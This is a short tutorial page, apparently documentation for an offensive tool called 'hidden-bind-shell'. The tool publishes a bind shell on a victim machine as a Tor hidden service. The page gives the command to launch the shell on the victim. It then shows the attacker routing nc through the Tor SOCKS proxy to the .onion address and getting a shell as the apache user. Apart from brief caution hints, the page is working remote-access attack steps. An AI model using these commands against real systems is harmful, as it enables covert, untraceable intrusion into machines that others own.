# Multi-shell access with hidden-bind-shell

In order to get a bind shell served by Victim1 on the Tor network, we will use **hidden-bind-shell** as follows. As shown in the following illustration, the victim publish a Hidden Server so that any connection will serve a shell.

{% hint style="danger" %}
When the bind shell is publish, any access will be replied with a shell. **Use with CAUTION!**
{% endhint %}

![Hidden Service as Bind Shell](../.gitbook/assets/image.png)

## 1. Hidden Service for bind shell

In order to get a bind shell served by Victim1, we will use **hidden-bind-shell**. We need to specify the hidden service port with **-hiddensrvport** parameter and the datadir with **-data-dir** parameter.

```text
[victim1]$ ./hidden-bind-shell -data-dir /tmp/datadir/ -hiddensrvport 1234
...
Bind shell is listening on hgnzi6j3rqog6yew.onion:1234
```

{% hint style="warning" %}
Using **-data-dir** parameter is specially important here. It will contain the keys for the Hidden Service so that the onion address doesn't change. If not specified, each execution will create a different Hidden Service.
{% endhint %}

## 2. Connect to the bind shell

Now that the Hidden Service is listening, the attacker will attempt to gain a shell:

{% hint style="info" %}
Note that the Tor instance proxy must be running so that the traffix is rooted to Tor network.
{% endhint %}

```text
[attacker]$ alias nctor='nc --proxy 127.0.0.1:9050 --proxy-type socks5'
[attacker]$ nctor -v hgnzi6j3rqog6yew.onion 1234
...
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

